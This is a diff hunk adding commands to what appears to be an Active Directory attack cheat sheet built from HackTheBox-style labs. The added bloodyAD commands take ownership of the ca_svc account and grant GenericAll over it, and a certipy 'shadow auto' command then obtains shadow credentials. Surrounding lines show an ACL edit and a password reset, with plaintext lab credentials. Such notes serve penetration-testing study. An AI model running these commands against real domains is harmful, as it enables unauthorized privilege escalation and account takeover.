@@ -218,6 +218,14 @@ python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -ri
 
 net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
 ```
+```bash
+bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+
+bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+
+# Shadow Credentail
+certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
+```
 ```powershell
 import-module .\powerview.ps1
 
